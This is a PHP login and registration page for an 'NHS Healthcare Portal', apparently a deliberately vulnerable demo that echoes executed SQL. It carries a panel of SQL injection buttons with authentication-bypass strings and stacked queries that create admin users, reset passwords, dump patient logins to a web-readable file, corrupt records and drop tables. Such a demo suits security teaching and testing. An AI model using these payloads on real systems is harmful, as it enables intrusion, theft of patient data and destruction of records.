<?php include 'db_connection.php'; ?>
<?php include 'register.php'; ?>
<?php include 'login.php'; ?>

<?php
if ($db_connection_successful) {
    // Start of HTML document
    ?>

<body>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles/accountindex.css">
    <title>NHS Healthcare Portal</title>
</head>
<body>
    <div class="container">
        <div class="form-container" id="loginContainer">
            <h2>Login</h2>
                <form id="loginForm" action="login.php" method="post">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username">

                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password">

                    <button type="submit" name="action" value="login">Login</button>
                    <button type="submit" name="action" value="test">Login Tester</button>
                </form>
            <p class="toggle-btn" onclick="toggleForm()" style="color: blue; cursor: pointer;">Don't have an account yet? Register</p>
            <a href="/" class="home-button">Return to Homepage</a>
            <!-- Error message div -->
            <div id="errorMessage" style="color: red;">
                <?php 
                    echo isset($_SESSION['errorMsg']) ? $_SESSION['errorMsg'] : ""; 
                    unset($_SESSION['errorMsg']); // Clear the error message after displaying
                ?>
            </div>
        </div>

        <div class="form-container" id="registerContainer" style="display: none;">
            <h2>Register</h2>
                <form id="registerForm" action="register.php" method="post">
                    <label for="nhs_number">NHS Number:</label>
                    <input type="text" id="nhs_number" name="nhs_number" required>

                    <label for="first_name">First Name:</label>
                    <input type="text" id="first_name" name="first_name" required>

                    <label for="last_name">Last Name:</label>
                    <input type="text" id="last_name" name="last_name" required>

                    <label for="email">Email:</label>
                    <input type="email" id="email" name="email" required>

                    <label for="new_username">Username:</label>
                    <input type="text" id="new_username" name="new_username" required>

                    <label for="new_password">Password:</label>
                    <input type="password" id="new_password" name="new_password" required>

                    <button type="submit">Register</button>
                </form>
            <p class="toggle-btn" onclick="toggleForm()" style="color: blue; cursor: pointer;">Already have an account? Login</p>
            <a href="/" class="home-button">Return to Homepage</a>
        </div>
    </div>

    <?php if (isset($_SESSION['executedSQL'])): ?>
        <div class="alert alert-info">
            <?php echo $_SESSION['message'] ?? "Attempted login."; ?>
            <br>Executed SQL: <?php echo htmlspecialchars($_SESSION['executedSQL']); ?>
        </div>
        <?php unset($_SESSION['message'], $_SESSION['executedSQL']); ?>
    <?php endif; ?>

    <!-- Container for SQL injection buttons -->
    <div class="container form-container" style="margin-top: 20px;"> 
        <h3>SQL Injection Test</h3>
        <button class="sql-inject-btn" onclick="injectSQL('admin\'-- ')">Inject: admin'--</button>
        <button class="sql-inject-btn" onclick="injectSQL('[Replace User]\'-- ')">Inject: [User]'--</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR 1=1; -- ')">Inject: ' OR 1=1; --</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; -- ')">Inject: ' OR '1'='1'; --</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; DELETE FROM \`patient logins\` WHERE \`Login\` = \'USERNAME\'; -- ')">Inject: ' OR '1'='1'; DELETE FROM `patient logins` WHERE `Login` = 'USERNAME'; -- </button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; INSERT INTO \`patient logins\` (\`NHS_#\`, \`First Name\`, \`Last Name\`, \`Email\`, \`Login\`, \`Password\`, \`Role ID\`) VALUES (\'999999999\', \'Injected\', \'Admin\', \'injected@admin.com\', \'injectadmin\', \'password\', 101); -- ')">Create Admin User</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; UPDATE \`patient logins\` SET \`Password\`=\'newpassword\' WHERE \`Role ID\`=101; --')">Change Admin Password</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; UPDATE \`patient logins\` SET \`Role ID\`=101 WHERE \`Login\`=\'Johndoe123\'; --')">Grant Admin Privileges</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; SELECT * INTO OUTFILE \'C:/xampp/htdocs/data_leak.txt\' FROM \`patient logins\`; --')">Export User Data</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; UPDATE \`patient logins\` SET \`Email\`=\'corrupted@email.com\'; --')">Corrupt All Emails</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; UPDATE \`patient logins\` SET \`Password\`=\'disabled\' WHERE \`Role ID\`!=101; --')">Disable All Non-Admin Accounts</button>
        <button class="sql-inject-btn" onclick="injectSQL('\' OR \'1\'=\'1\'; DROP TABLE \`TABLE NAME\`; -- ')">Inject: Drop Table [WARNING: VERY DESTRUCTIVE!]</button>
    </div>

    <script>
        function injectSQL(payload) {
            document.getElementById('username').value = payload;
        }
    </script>

    <script>
        function toggleForm() {
            const loginContainer = document.getElementById('loginContainer');
            const registerContainer = document.getElementById('registerContainer');

            if (loginContainer.style.display !== 'none') {
                loginContainer.style.display = 'none';
                registerContainer.style.display = 'block';
            } else {
                loginContainer.style.display = 'block';
                registerContainer.style.display = 'none';
            }
        }
    </script>

    <script src="script.js"></script>


</body>
</html>

<?php
} else {
    // Database Connection Error
    echo '<p style="color: red;">Error: Unable to connect to the database</p>';
}
?>